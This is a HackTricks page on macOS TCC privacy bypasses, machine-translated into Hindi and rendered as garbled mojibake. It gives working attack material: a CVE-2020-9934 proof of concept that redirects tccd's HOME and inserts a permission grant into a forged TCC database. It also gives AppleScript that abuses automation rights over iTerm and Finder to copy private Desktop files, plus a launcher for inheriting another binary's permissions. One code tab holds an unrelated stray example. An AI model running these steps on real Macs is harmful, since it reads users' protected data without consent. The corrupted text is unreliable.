# macOS TCC рдмрд╛рдИрдкрд╛рд╕

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PRs рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ**.

</details>

## рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХреЗ рдЕрдиреБрд╕рд╛рд░

### рд▓реЗрдЦрди рдмрд╛рдИрдкрд╛рд╕

рдпрд╣ рдХреЛрдИ рдмрд╛рдИрдкрд╛рд╕ рдирд╣реАрдВ рд╣реИ, рдпрд╣ рдмрд╕ TCC рдХрд╛ рдХрд╛рдо рдХрд░рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рд╣реИ: **рдпрд╣ рд▓реЗрдЦрди рд╕реЗ рд╕реБрд░рдХреНрд╖рд╛ рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ**ред рдпрджрд┐ рдЯрд░реНрдорд┐рдирд▓ **рдХрд┐рд╕реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдбреЗрд╕реНрдХрдЯреЙрдк рдХреЛ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реИ рддреЛ рдлрд┐рд░ рднреА рдЙрд╕рдореЗрдВ рд▓рд┐рдЦ рд╕рдХрддрд╛ рд╣реИ**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
**рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рдЧреБрдгрд╛рдВрдХ `com.apple.macl`** рдирдП **рдлрд╝рд╛рдЗрд▓** рдореЗрдВ рдЬреЛрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ **рдирд┐рд░реНрдорд╛рддрд╛ рдРрдк** рдХреЛ рдЗрд╕реЗ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓ рд╕рдХреЗред

### TCC рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдкрде

рдХрд┐рд╕реА TCC рдЕрдиреБрдорддрд┐ рдХреЛ рдПрдХ рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рджреЗрдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рд╕рд╛рдорд╛рдиреНрдп рддрд░реАрдХрд╛ рдмрдВрдбрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рднреА рд╕рдВрднрд╡ рд╣реИ рдХрд┐ **рдПрдХреНрд╕реЗрд╕ рдХреЛ рдЪреЛрд░реА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдЬрдм рдЖрдк рдмрд╛рдЗрдирд░реА рдХреЛ рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЖрдк рдЗрд╕ рдХреЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдмрд╛рдЗрдирд░реА рдХреЛ рдХреЙрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% tabs %}
{% tab title="invoker.m" %}
```
#import <Foundation/Foundation.h>

// clang -fobjc-arc -framework Foundation invoker.m -o invoker

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Check if the argument is provided
if (argc != 2) {
NSLog(@"Usage: %s <path_to_executable>", argv[0]);
return 1;
}

// Create a new task
NSTask *task = [[NSTask alloc] init];

// Set the task's launch path to the provided argument
[task setLaunchPath:@(argv[1])];

// Launch the task
[task launch];

// Wait for the task to complete
[task waitUntilExit];
}
return 0;
}
```
{% tab title="shell.c" %}

рдпрд╣рд╛рдВ рд╣рдо рдПрдХ рд╕рд╛рдзрд╛рд░рдг C рдкреНрд░реЛрдЧреНрд░рд╛рдо рджреЗрдЦ рд░рд╣реЗ рд╣реИрдВ рдЬрд┐рд╕реЗ "shell.c" рдирд╛рдордХ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╕рд╣реЗрдЬрд╛ рдЧрдпрд╛ рд╣реИред рдпрд╣ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдПрдХ рдирдП рд╢реЗрд▓ рдкреНрд░реЛрд╕реЗрд╕ рдХреЛ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП fork рдФрд░ execvp рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рд╣реИ рдХрд┐ рдпрд╣ рдПрдХ рдирдП рд╢реЗрд▓ рдкреНрд░реЛрд╕реЗрд╕ рдореЗрдВ рдПрдХ рдирдП рдХрдорд╛рдВрдб рдкреНрд░рд╛рд░рдВрдн рдХрд░реЗрдЧрд╛ред

```c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>

int main() {
    pid_t pid;
    int status;

    pid = fork();

    if (pid == 0) {
        // Child process
        char *args[] = {"/bin/sh", "-c", "ls -l", NULL};
        execvp(args[0], args);
        perror("execvp");
        _exit(1);
    } else if (pid > 0) {
        // Parent process
        waitpid(pid, &status, 0);
    } else {
        // Fork failed
        perror("fork");
        return 1;
    }

    return 0;
}
```

рдЗрд╕ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ рдХрдВрдкрд╛рдЗрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:

```shell
gcc -o shell shell.c
```

рдЗрд╕рдХреЗ рдмрд╛рдж, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ рдЪрд▓рд╛рдПрдВ:

```shell
./shell
```

рдЗрд╕ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЗ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк, рдирдП рд╢реЗрд▓ рдкреНрд░реЛрд╕реЗрд╕ рдореЗрдВ "ls -l" рдХрдорд╛рдВрдб рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдЙрд╕рдХрд╛ рдЖрдЙрдЯрдкреБрдЯ рдореБрджреНрд░рд┐рдд рд╣реЛрдЧрд╛ред

{% endtab %}
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>  // For execl and fork

// gcc shell.c -o shell
// mv shell </path/bin/with/TCC>

int main() {
pid_t pid = fork();

if (pid == -1) {
// Fork failed
perror("fork");
return 1;
} else if (pid == 0) {
// Child process
execl("/Applications/iTerm.app/Contents/MacOS/iTerm2", "iTerm2", (char *) NULL);

// execl only returns if there's an error
perror("execl");
exit(EXIT_FAILURE);
} else {
// Parent process
int status;
waitpid(pid, &status, 0);  // Wait for the child process to finish

if (WIFEXITED(status)) {
// Return the exit status of iTerm2
return WEXITSTATUS(status);
}
}

return 0;
}
```
{% endtab %}
{% endtabs %}



### SSH рдмрд╛рдИрдкрд╛рд╕

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ **SSH рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреВрд░реА рдбрд┐рд╕реНрдХ рдПрдХреНрд╕реЗрд╕** рд╣реЛрддрд╛ рдерд╛ред рдЗрд╕реЗ рдЕрдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ рдЗрд╕реЗ рд╕реВрдЪреА рдореЗрдВ рд░рдЦрдирд╛ рд╣реЛрдЧрд╛ рд▓реЗрдХрд┐рди рдЕрдХреНрд╖рдо рдХрд░рдирд╛ рд╣реЛрдЧрд╛ (рд╕реВрдЪреА рд╕реЗ рд╣рдЯрд╛рдиреЗ рд╕реЗ рдпреЗ рдЕрдзрд┐рдХрд╛рд░ рд╣рдЯрд╛рдП рдирд╣реАрдВ рдЬрд╛рдПрдВрдЧреЗ):

![](<../../../../../.gitbook/assets/image (569).png>)

рдпрд╣рд╛рдВ рдЖрдкрдХреЛ рдХреБрдЫ **рдореИрд▓рд╡реЗрдпрд░реНрд╕ рдХреЗ рдЙрджрд╛рд╣рд░рдг рдорд┐рд▓реЗрдВрдЧреЗ рдЬрд┐рдиреНрд╣реЛрдВрдиреЗ рдЗрд╕ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рджреМрд░ рдХрд░рдиреЗ рдореЗрдВ рд╕рдлрд▓рддрд╛ рдкреНрд░рд╛рдкреНрдд рдХреА рд╣реИ**:

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЕрдм SSH рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ **рдкреВрд░реА рдбрд┐рд╕реНрдХ рдПрдХреНрд╕реЗрд╕** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ
{% endhint %}

### рдПрдХреНрд╕рдЯреЗрдВрд╢рдиреНрд╕ рдХрд╛ рд╣реИрдВрдбрд▓ рдХрд░реЗрдВ - CVE-2022-26767

рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ **`com.apple.macl`** рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдПрдХ **рдирд┐рд╢реНрдЪрд┐рдд рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЙрд╕реЗ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓ рд╕рдХреЗ**ред рдпрд╣ рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ рд╕реЗрдЯ рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдЖрдк рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдПрдХ рдРрдк рдкрд░ **рдбреНрд░реИрдЧ рдПрдВрдб рдбреНрд░реЙрдк** рдХрд░рддреЗ рд╣реИрдВ, рдпрд╛ рдЬрдм рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХреЛ **рдбрдмрд▓-рдХреНрд▓рд┐рдХ** рдХрд░рдХреЗ рдЗрд╕реЗ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдПрдкреНрд▓рд┐рдХреЗрд╢рди** рдХреЗ рд╕рд╛рде рдЦреЛрд▓рддрд╛ рд╣реИред

рдЗрд╕рд▓рд┐рдП, рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **рдПрдХ рдЦрддрд░рдирд╛рдХ рдРрдк** рдХреЛ рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рд╕рднреА рдПрдХреНрд╕рдЯреЗрдВрд╢рдиреНрд╕ рдХреЛ рд╣реИрдВрдбрд▓ рдХрд░реЗрдЧрд╛ рдФрд░ рд▓реЙрдиреНрдЪ рд╕рд░реНрд╡рд┐рд╕реЗрдЬ рдХреЛ рдХреЙрд▓ рдХрд░реЗрдЧрд╛ рддрд╛рдХрд┐ рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рдХреЛ **рдЦреЛрд▓реЗрдВ** (рдЗрд╕рд▓рд┐рдП рдЦрддрд░рдирд╛рдХ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓реЗрдЧреА)ред

### iCloud

рдПрдВрдЯрд╛рдЗрдЯрд▓рдореЗрдВрдЯ **`com.apple.private.icloud-account-access`** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **`com.apple.iCloudHelper`** XPC рд╕реЗрд╡рд╛ рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдЬрд┐рд╕рд╕реЗ **iCloud рдЯреЛрдХрди рдкреНрд░рджрд╛рди рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред

**iMovie** рдФрд░ **Garageband** рдореЗрдВ рдЗрд╕ рдПрдВрдЯрд╛рдЗрдЯрд▓рдореЗрдВрдЯ рдХреЗ рд╕рд╛рде рдФрд░ рднреА рдЕрдиреБрдорддрд┐рдпрд╛рдВ рдереАрдВред

рдЙрд╕ рдПрдВрдЯрд╛рдЗрдЯрд▓рдореЗрдВрдЯ рд╕реЗ iCloud рдЯреЛрдХрди рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ **рдЬрд╛рдирдХрд╛рд░реА** рдХреЗ рд▓рд┐рдП рдЯреЙрдХ рджреЗрдЦреЗрдВ: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

**`kTCCServiceAppleEvents`** рдЕрдиреБрдорддрд┐ рд╡рд╛рд▓реЗ рдРрдк рдХреЛ рдЕрдиреНрдп рдРрдкреНрд╕ рдХреЛ **рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛** рд╣реЛрдЧреАред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдпрд╣ рдЕрдиреНрдп рдРрдкреНрд╕ рдХреЛ рдкреНрд░рджрд╛рди рдХреА рдЧрдИ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред

Apple рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ:

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рдПрдХ рдРрдк рдХреЛ **`iTerm` рдкрд░ рдСрдЯреЛрдореЗрд╢рди рдЕрдиреБрдорддрд┐** рд╣реИ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ **`Terminal`** рдХреЛ iTerm рдкрд░ рдкрд╣реБрдВрдЪ рд╣реИ:

<figure><img src="../../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

#### iTerm рдкрд░

FDA рдирд╣реАрдВ рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ Terminal, iTerm рдХреЛ рдХреЙрд▓ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ FDA рд╣реЛрддрд╛ рд╣реИ, рдФрд░ рдЗрд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```
{% endcode %}
```bash
osascript iterm.script
```
#### Finder рдХреЗ рдКрдкрд░

рдпрд╛ рдЕрдЧрд░ рдХрд┐рд╕реА рдРрдк рдХреЛ Finder рдХреЗ рдКрдкрд░ рдПрдХреНрд╕реЗрд╕ рд╣реИ, рддреЛ рд╡рд╣ рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЬреИрд╕рд╛ рдпрд╣ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## рдРрдк рдХреЗ рд╡реНрдпрд╡рд╣рд╛рд░ рджреНрд╡рд╛рд░рд╛

### CVE-2020тАУ9934 - TCC <a href="#c19b" id="c19b"></a>

рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рднреВрдорд┐рдХрд╛ **tccd рдбреЗрдорди** рдЬреЛ **`HOME`** **env** рдЪрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдпрд╣ TCC рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдбреЗрдЯрд╛рдмреЗрд╕ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХреЗ: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[рдЗрд╕ Stack Exchange рдкреЛрд╕реНрдЯ](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдФрд░ рдХреНрдпреЛрдВрдХрд┐ TCC рдбреЗрдорди `launchd` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдореМрдЬреВрджрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдбреЛрдореЗрди рдХреЗ рднреАрддрд░ рдЪрд▓ рд░рд╣рд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЗрд╕реЗ рдкрд╛рд╕ рдХрд┐рдП рдЧрдП рд╕рднреА рд╡рд╛рддрд╛рд╡рд░рдг рдЪрд░реЛрдВ рдХреЛ **рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ**ред\
рдЗрд╕ рдкреНрд░рдХрд╛рд░, рдПрдХ **рд╣рдорд▓рд╛рд╡рд░ рдпрд╣ рд╕реЗрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ `$HOME` рд╡рд╛рддрд╛рд╡рд░рдг** рдЪрд░ рдХреЛ **`launchctl`** рдореЗрдВ рдПрдХ **рдирд┐рдпрдВрддреНрд░рд┐рдд** **рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛** рдХреА рдУрд░ рдкрд╣реБрдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, **TCC** рдбреЗрдорди рдХреЛ **рдкреБрдирдГ рдЖрд░рдВрдн** рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ рдлрд┐рд░ **рд╕реАрдзреЗ TCC рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд░ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЗрд╕реЗ рдЕрдВрддрд┐рдо рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдкреНрд░рд╢реНрди рди рдХрд░рддреЗ рд╣реБрдП **рд╣рд░ TCC рдЕрдзрд┐рдХрд╛рд░** рдХреЛ рджреЗ рд╕рдХреЗред\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - рдиреЛрдЯреНрд╕

рдиреЛрдЯреНрд╕ рдХреЛ TCC рд╕реБрд░рдХреНрд╖рд┐рдд рд╕реНрдерд╛рдиреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рдереА, рд▓реЗрдХрд┐рди рдЬрдм рдПрдХ рдиреЛрдЯ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдпрд╣ **рдПрдХ рдЧреИрд░-рд╕реБрд░рдХреНрд╖рд┐рдд рд╕реНрдерд╛рди рдореЗрдВ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред рдЗрд╕рд▓рд┐рдП, рдЖрдк рдиреЛрдЯреНрд╕ рд╕реЗ рдХрд╣ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рд╡рд╣ рдПрдХ рд╕реБрд░рдХреНрд╖рд┐рдд рдлрд╝рд╛рдЗрд▓ рдХреЛ рдПрдХ рдиреЛрдЯ рдореЗрдВ рдХреЙрдкреА рдХрд░реЗрдВ (рдЗрд╕рд▓рд┐рдП рдПрдХ рдЧреИрд░-рд╕реБрд░рдХреНрд╖рд┐рдд рд╕реНрдерд╛рди рдореЗрдВ) рдФрд░ рдлрд┐рд░ рдлрд╝рд╛рдЗрд▓ рддрдХ рдкрд╣реБрдВрдЪреЗрдВ:

<figure><img src="../../../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - рдЯреНрд░рд╛рдВрд╕рд▓реЛрдХреЗрд╢рди

рдмрд╛рдЗрдирд░реА `/usr/libexec/lsd` рдЬрд┐рд╕рдореЗрдВ рдкреБрд╕реНрддрдХрд╛рд▓рдп `libsecurity_translocate` рд╣реЛрддреА рд╣реИ, рдХреЗ рдкрд╛рд╕ рдПрдВрдЯрд╛рдЗрдЯрд▓рдореЗрдВрдЯ `com.apple.private.nullfs_allow` рдереА рдЬрд┐рд╕рд╕реЗ рдЗрд╕реЗ **nullfs** рдорд╛рдЙрдВрдЯ рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓реА рдФрд░ рдПрдВрдЯрд╛рдЗрдЯрд▓рдореЗрдВрдЯ `com.apple.private.tcc.allow` рдереА рдЬрд┐рд╕рдореЗрдВ **`kTCCServiceSystemPolicyAllFiles`** рд╣реЛрддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╣рд░ рдлрд╝рд╛рдЗрд▓ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХреЗрдВред

"рд▓рд╛рдЗрдмреНрд░реЗрд░реА" рдХреЛ рдХреНрд╡рд╛рд░рдВрдЯреАрди рдЧреБрдгрд╛рдВрдХ рдЬреЛрдбрд╝рдирд╛ рд╕рдВрднрд╡ рдерд╛, **`com.apple.security.translocation`** XPC рд╕реЗрд╡рд╛ рдХреЛ рдХреЙрд▓ рдХрд░рдирд╛ рд╕рдВрднрд╡ рдерд╛ рдФрд░ рдлрд┐рд░ рдпрд╣ "рд▓рд╛рдЗрдмреНрд░реЗрд░реА" рдХреЛ **`$TMPDIR/AppTranslocation/d/d/Library`** рд╕реЗ рдореИрдк рдХрд░ рджреЗрддрд╛ рдерд╛ рдЬрд╣рд╛рдВ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЗ рдЕрдВрджрд░ рдХреЗ рд╕рднреА рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдВрднрд╡ рдереАред

### CVE-2023-38571 - рд╕рдВрдЧреАрдд рдФрд░ рдЯреАрд╡реА <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`рд╕рдВрдЧреАрдд`** рдореЗрдВ рдПрдХ рджрд┐рд▓рдЪрд╕реНрдк рд╕реБрд╡рд┐рдзрд╛ рд╣реИ: рдЬрдм рдпрд╣ рдЪрд▓ рд░рд╣рд╛ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ "рдореАрдбрд┐рдпрд╛ рдкреБрд╕реНрддрдХрд╛рд▓рдп" рдореЗрдВ рдбреНрд░реЙрдк рдХреА рдЧрдИ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** рдореЗрдВ рдЖрдпрд╛рдд рдХрд░реЗрдЧрд╛ред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрд╣ рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рдХрд╛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИ: **`rename(a, b);`** рдЬрд╣рд╛рдВ `a` рдФрд░ `b` рд╣реИрдВ:

* `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
* `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3`

